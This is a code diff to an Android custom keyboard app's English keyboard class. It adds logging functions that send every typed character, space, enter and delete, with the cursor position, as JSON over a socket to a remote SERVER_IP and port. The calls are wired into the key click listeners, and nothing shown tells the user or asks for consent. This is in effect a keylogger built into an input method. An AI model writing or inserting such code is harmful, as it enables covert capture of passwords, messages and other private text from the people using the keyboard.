@@ -11,6 +11,7 @@ import android.content.Context.AUDIO_SERVICE
 import android.content.SharedPreferences
 import android.content.res.Configuration
 import android.os.*
+import android.util.Log
 import android.view.KeyEvent
 import android.view.MotionEvent
 import android.view.animation.Animation
@@ -18,6 +19,9 @@ import android.widget.ImageView
 import android.widget.TextView
 import androidx.core.view.children
 import com.myhome.rpgkeyboard.*
+import org.json.JSONObject
+import java.util.*
+import kotlin.math.log
 
 class KeyboardEnglish constructor(var context:Context, var layoutInflater: LayoutInflater, var keyboardInterationListener: KeyboardInterationListener) {
     lateinit var englishLayout: LinearLayout
@@ -45,6 +49,43 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
     var sound = 0
     var vibrate = 0
     var capsView:ImageView? = null
+
+    fun getCursorPosition(): Int {
+        return inputConnection?.getTextBeforeCursor(1000, 0)?.length ?: 0
+    }
+
+    fun logCommit(text:String){
+        val jsonmessage = JSONObject()
+        jsonmessage.put("type", "commit");
+        jsonmessage.put("char", text);
+        jsonmessage.put("cursor", getCursorPosition()+1);
+        SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
+    }
+
+    fun logEnter(cursorPosition: Int){
+        var josonmessage = JSONObject()
+        josonmessage.put("type", "commit")
+        josonmessage.put("char", "\n")
+        josonmessage.put("cursor", cursorPosition)
+        SocketClient(SERVER_IP, SERVER_PORT, josonmessage).execute()
+    }
+
+    fun logSpace(cursorPosition: Int){
+        var josonmessage = JSONObject()
+        josonmessage.put("type", "commit")
+        josonmessage.put("char", " ")
+        josonmessage.put("cursor", cursorPosition)
+        SocketClient(SERVER_IP, SERVER_PORT, josonmessage).execute()
+    }
+
+    fun logDelete(cursorPosition: Int){
+        var jsonmessage = JSONObject()
+        jsonmessage.put("type", "delete");
+        jsonmessage.put("cursor", getCursorPosition());
+        SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
+    }
+
+
 
     fun init() {
         englishLayout = layoutInflater.inflate(R.layout.keyboard_action, null) as LinearLayout
@@ -183,6 +224,7 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     private fun getMyClickListener(actionButton:Button):View.OnClickListener{
         val clickListener = (View.OnClickListener {
+            logCommit(actionButton.text.toString())
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 inputConnection?.requestCursorUpdates(InputConnection.CURSOR_UPDATE_IMMEDIATE)
             }
@@ -333,6 +375,7 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
     }
     fun getSpaceAction():View.OnClickListener{
         return View.OnClickListener{
+            logSpace(getCursorPosition())
             playClick('ㅂ'.toInt())
             playVibrate()
             inputConnection?.commitText(" ",1)
@@ -341,6 +384,7 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     fun getDeleteAction():View.OnClickListener{
         return View.OnClickListener{
+            logDelete(getCursorPosition())
             playVibrate()
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 inputConnection?.deleteSurroundingTextInCodePoints(1, 0)
@@ -359,6 +403,7 @@ class KeyboardEnglish constructor(var context:Context, var layoutInflater: Layou
 
     fun getEnterAction():View.OnClickListener{
         return View.OnClickListener{
+            logEnter(getCursorPosition())
             playVibrate()
             val eventTime = SystemClock.uptimeMillis()
             inputConnection?.sendKeyEvent(KeyEvent(eventTime, eventTime,
